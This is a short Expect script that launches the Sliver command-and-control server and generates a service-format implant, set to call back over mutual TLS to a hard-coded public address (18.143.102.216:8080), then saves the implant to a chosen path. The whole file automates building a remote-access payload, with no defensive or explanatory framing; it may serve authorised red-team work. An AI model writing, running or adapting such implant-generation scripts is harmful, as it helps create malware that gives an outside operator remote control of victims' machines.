#!/usr/bin/expect

if {$argc != 1} {
    puts "Usage: $argv0 <file_path>"
    exit 1
}

set file_path [lindex $argv 0]

# Activate Sliver server
spawn sliver-server

# Wait for sliver-server to start (you can adjust the sleep duration as needed)
sleep 0.1

# Generate the payload
send "generate --format service --mtls 18.143.102.216:8080 --save $file_path\r"

# Expect output indicating the payload generation
expect {
    "Payload generated successfully" {
        # Do something, maybe log the success
        puts "Payload generated successfully!"
    }
    "Implant saved to $file_path" {
        # If this output is received, it means the payload is generated
        puts "Payload generated successfully!"
        # Now send the exit command
        send "exit\r"
    }
    timeout {
        # Handle timeout
        puts "Timeout occurred while waiting for payload generation."
        # Send exit command if it's stuck
        send "exit\r"
        exit 1
    }
}

# Wait for the process to finish
wait
